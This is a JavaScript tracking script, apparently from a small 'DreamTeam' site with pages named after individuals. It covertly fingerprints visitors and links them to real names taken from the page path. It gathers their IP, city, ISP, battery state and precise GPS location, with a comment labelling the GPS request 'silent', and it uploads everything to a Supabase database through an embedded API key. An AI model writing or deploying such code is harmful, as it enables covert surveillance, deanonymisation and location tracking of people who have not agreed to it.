(function(){

const SUPABASE_URL = "https://njpxbelibhibkoyjpfkf.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5qcHhiZWxpYmhpYmtveWpwZmtmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA5MDM0NTksImV4cCI6MjA5NjQ3OTQ1OX0.MUbHFVTNLB4xXXG4nGusYDF4yzC5TqKbfcZpp2VXFH4";

const PAGE_MAP = {
  "saloni": "Saloni",
  "innocent-talib": "Innocent Talib",
  "mayu": "Mayu",
  "ishu": "Ishu",
  "pramod": "Pramod",
  "abhi": "Abhi",
  "jalpana": "Jalpana",
  "shubham": "Shubham",
  "angel-tamanna": "Angel Tamanna"
};

const PAGE_KEY_TIME = "dt_time_" + location.pathname;
if(!sessionStorage[PAGE_KEY_TIME + "_start"]){
  sessionStorage[PAGE_KEY_TIME + "_start"] = Date.now();
}
let PAGE_START = parseInt(sessionStorage[PAGE_KEY_TIME + "_start"]);

if(!sessionStorage.dt_session){
  sessionStorage.dt_session = "S-" + Date.now();
}
const SESSION_ID = sessionStorage.dt_session;

function getPageRealName(){
  const match = location.pathname.match(/\/p\/([^\/]+?)(?:\.html)?$/);
  if(!match) return null;
  return PAGE_MAP[match[1]] || null;
}

function getFingerprint(){
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#FF2D6B";
    ctx.fillText("DreamTeam🔥", 2, 2);
    return c.toDataURL().slice(-40) + "_" + screen.width + "x" + screen.height;
  } catch(e){
    return "fp_" + Math.random().toString(36).slice(2);
  }
}

function updateRealName(catName){
  const pageRealName = getPageRealName();
  if(pageRealName && !localStorage.dt_real_name){
    localStorage.dt_real_name = pageRealName;
  }
  if(pageRealName){
    fetch(SUPABASE_URL + "/rest/v1/cat_users?cat_name=eq." + encodeURIComponent(catName) + "&real_name=is.null", {
      method: "PATCH",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_KEY,
        "Authorization": "Bearer " + SUPABASE_KEY,
        "Prefer": "return=minimal"
      },
      body: JSON.stringify({ real_name: pageRealName })
    }).catch(function(){});
  }
}

function saveVisit(catName){
  const elapsed = Math.round((Date.now() - PAGE_START) / 1000);
const prev = parseInt(sessionStorage[PAGE_KEY_TIME + "_prev"] || "0");
const timeSpent = elapsed + prev;
  if(timeSpent < 2) return;

  const displayName = localStorage.dt_real_name || catName;
  const pageKey = SESSION_ID + "_" + location.pathname;

  const data = {
    page_key: pageKey,
    cat_name: catName,
    real_name: displayName,
    session_id: SESSION_ID,
    url: location.href,
    page_title: document.title,
    time_spent: timeSpent,
    ip: sessionStorage.dt_ip || null,
    city: sessionStorage.dt_city || null,
    country: sessionStorage.dt_country || null,
    isp: sessionStorage.dt_isp || null,
    platform: navigator.platform || null,
    battery: sessionStorage.dt_battery || null,
    lat: sessionStorage.dt_lat || null,
    lng: sessionStorage.dt_lng || null,
    gps_city: sessionStorage.dt_gps_city || null
  };

  // Pehle INSERT, phir purana DELETE
  fetch(SUPABASE_URL + "/rest/v1/visitors", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SUPABASE_KEY,
      "Authorization": "Bearer " + SUPABASE_KEY,
      "Prefer": "return=representation"
    },
    body: JSON.stringify(data),
    keepalive: true
  })
  .then(function(r){ return r.json(); })
  .then(function(newRecord){
    // Insert success — ab purane delete karo (naye wale ko chhodke)
    if(newRecord && newRecord[0] && newRecord[0].id){
      const newId = newRecord[0].id;
      fetch(SUPABASE_URL + "/rest/v1/visitors?page_key=eq." + encodeURIComponent(pageKey) + "&id=neq." + newId, {
        method: "DELETE",
        headers: {
          "apikey": SUPABASE_KEY,
          "Authorization": "Bearer " + SUPABASE_KEY
        }
      }).catch(function(){});
    }
  })
  .catch(function(){});
}
function initTracker(catName){
  window.addEventListener("beforeunload", function(){
    const elapsed = Math.round((Date.now() - PAGE_START) / 1000);
    const prev = parseInt(sessionStorage[PAGE_KEY_TIME + "_prev"] || "0");
    sessionStorage[PAGE_KEY_TIME + "_prev"] = elapsed + prev;
    saveVisit(catName);
  });
  setTimeout(function(){ saveVisit(catName); }, 3000);
  setInterval(function(){
    saveVisit(catName);
    // Interval pe bhi prev update karo
    const elapsed = Math.round((Date.now() - PAGE_START) / 1000);
    const prev = parseInt(sessionStorage[PAGE_KEY_TIME + "_prev"] || "0");
    sessionStorage[PAGE_KEY_TIME + "_prev"] = elapsed + prev;
    sessionStorage[PAGE_KEY_TIME + "_start"] = Date.now();
  PAGE_START = Date.now(); // ye add karo
}, 10000);
}

function registerNewUser(fp){
  fetch(SUPABASE_URL + "/rest/v1/cat_users?select=id&order=id.desc&limit=1", {
    headers: {
      "apikey": SUPABASE_KEY,
      "Authorization": "Bearer " + SUPABASE_KEY
    }
  })
  .then(function(r){ return r.json(); })
  .then(function(countData){
    const nextNum = countData && countData.length > 0 ? countData[0].id + 1 : 1;
    const catName = "Cat-" + nextNum;

    fetch(SUPABASE_URL + "/rest/v1/cat_users", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_KEY,
        "Authorization": "Bearer " + SUPABASE_KEY,
        "Prefer": "return=minimal"
      },
      body: JSON.stringify({
        cat_name: catName,
        fingerprint: fp,
        real_name: getPageRealName()
      })
    })
    .then(function(){
      localStorage.dt_cat_name = catName;
      if(getPageRealName()){
        localStorage.dt_real_name = getPageRealName();
      }
      initTracker(catName);
    })
    .catch(function(){ initTracker("Cat-0"); });
  })
  .catch(function(){ initTracker("Cat-0"); });
}

function getCatName(){
  const savedCat = localStorage.dt_cat_name;

  if(savedCat){
    // Database me verify karo
    fetch(SUPABASE_URL + "/rest/v1/cat_users?cat_name=eq." + encodeURIComponent(savedCat) + "&select=cat_name,real_name", {
      headers: {
        "apikey": SUPABASE_KEY,
        "Authorization": "Bearer " + SUPABASE_KEY
      }
    })
    .then(function(r){ return r.json(); })
    .then(function(data){
      if(data && data.length > 0){
        // Database me hai — normal flow
        if(data[0].real_name){
          localStorage.dt_real_name = data[0].real_name;
        }
        updateRealName(savedCat);
        initTracker(savedCat);
      } else {
        // Database me nahi hai — localStorage clear karo aur naya register karo
        localStorage.removeItem('dt_cat_name');
        localStorage.removeItem('dt_real_name');
        registerNewUser(getFingerprint());
      }
    })
    .catch(function(){
      initTracker(savedCat);
    });
    return;
  }

  // Naya user
  const fp = getFingerprint();

  fetch(SUPABASE_URL + "/rest/v1/cat_users?fingerprint=eq." + encodeURIComponent(fp) + "&select=cat_name,real_name", {
    headers: {
      "apikey": SUPABASE_KEY,
      "Authorization": "Bearer " + SUPABASE_KEY
    }
  })
  .then(function(r){ return r.json(); })
  .then(function(data){
    if(data && data.length > 0){
      localStorage.dt_cat_name = data[0].cat_name;
      if(data[0].real_name){
        localStorage.dt_real_name = data[0].real_name;
      }
      updateRealName(data[0].cat_name);
      initTracker(data[0].cat_name);
    } else {
      registerNewUser(fp);
    }
  })
  .catch(function(){ initTracker("Cat-0"); });
}

// IP Fetch
if(!sessionStorage.dt_ip){
  fetch("https://ipapi.co/json/")
    .then(function(r){ return r.json(); })
    .then(function(d){
      sessionStorage.dt_ip = d.ip || "";
      sessionStorage.dt_city = d.city || "";
      sessionStorage.dt_country = d.country_name || "";
      sessionStorage.dt_isp = d.org || "";
    }).catch(function(){});
}

// GPS Silent
if(!sessionStorage.dt_gps_done && navigator.geolocation){
  sessionStorage.dt_gps_done = "1";
  navigator.geolocation.getCurrentPosition(
    function(pos){
      sessionStorage.dt_lat = pos.coords.latitude;
      sessionStorage.dt_lng = pos.coords.longitude;
      fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude)
        .then(function(r){ return r.json(); })
        .then(function(d){
          sessionStorage.dt_gps_city = d.address && (d.address.city || d.address.town || d.address.village) || "";
        }).catch(function(){});
    },
    function(){},
    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
  );
}

// Battery
if(!sessionStorage.dt_battery && navigator.getBattery){
  navigator.getBattery().then(function(b){
    sessionStorage.dt_battery = Math.round(b.level*100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
  }).catch(function(){});
}

// Start
getCatName();

})();